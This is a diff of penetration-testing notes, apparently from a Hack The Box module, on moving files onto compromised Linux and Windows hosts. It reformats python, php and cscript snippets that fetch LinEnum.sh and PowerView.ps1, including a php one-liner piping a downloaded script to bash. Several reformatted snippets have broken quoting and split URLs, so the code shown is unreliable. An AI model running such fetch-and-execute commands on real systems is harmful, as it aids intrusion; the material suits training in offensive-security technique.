@@ -1,13 +1,4 @@
 # Linux File Transfers
-
-- cURL
-- wget
-- base64 Encoding & Decoding
-- Fileless attacks using cURL/wget, piping to bash/ Python
-- Downloads with Bash (/dev/tcp)
-- SSH Downloads
-- Web Uploads
-
 ## Wget download
 
 ```bash
@@ -22,7 +13,9 @@ lemur@htb ~ $ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootus
 
 ## Fileless attacks
 
-Note that some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.
+Note that some payloads such as `mkfifo` write files to disk. 
+Keep in mind that while the execution of the payload may be fileless when you use a pipe,
+depending on the payload chosen it may create temporary files on the OS.
 
 ### Fileless downloads using cURL and Wget
 
@@ -60,38 +53,39 @@ python3 -c
 
 import urllib.request
 urllib.request.urlretrieve(
-	"https://raw.githubuser.com/rebootuser/LinEnum/main/LinEnum.sh", "LinEnum.sh"
-	)
+	"https://raw.githubuser.com/rebootuser/LinEnum/main/LinEnum.sh", "LinEnum.sh")
 
 in python2.7 -c is just `import urllib; urllib.urlretrieve`
 ```
 
 Just download it:
 ```php
-php -r '
-$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/main/LinEnum.sh");
-file_put_contents("LinEnum.sh", $file);'
+php -r 
+	$file = file_get_contents("
+		https://raw.githubusercontent.com/rebootuser/LinEnum/main/LinEnum.sh");
+
+	file_put_contents("LinEnum.sh", $file);
 ```
 Pipe it to Bash:
 ```php
-php -r $lines = @file(
-	"https://raw.githubusercontent.com/rebootuser/LinEnum/main/LinEnum.sh"
-);
+php -r 
+	$lines = @file("
+		https://raw.githubusercontent.com/rebootuser/LinEnum/main/LinEnum.sh");
+
 foreach ($lines as $line_enum => $line) {
 	echo $line;
-}' | bash
+	
+	}' | bash
 ```
 Use Popen:
 ```php
 php -r 
 	const BUFFER = 1024;
 
-	$fremote = fopen(
-		"https://raw.githubusercontent.com/rebootuser/LinEnum/main/LinEnum.sh", "rb"
-	);
-	$flocal = fopen(
-		"LinEnum.sh", "wb"
-	);
+	$fremote = fopen("
+		https://raw.githubusercontent.com/rebootuser/LinEnum/main/LinEnum.sh", "rb");
+	$flocal = fopen("
+		LinEnum.sh", "wb");
 	
 	while ($buffer = fread($fremote, BUFFER)) {
 		fwrite($flocal, $buffer);
@@ -135,7 +129,9 @@ BinStream.SaveToFile(WScript.Arguments(1));
 
 Run the JS in Windows:
 ```PS
-C:\> cscript.exe \nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+C:\> cscript.exe \nologo wget.js 
+	https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 
+	to: PowerView.ps1
 ```
 
 Wget.vbs:
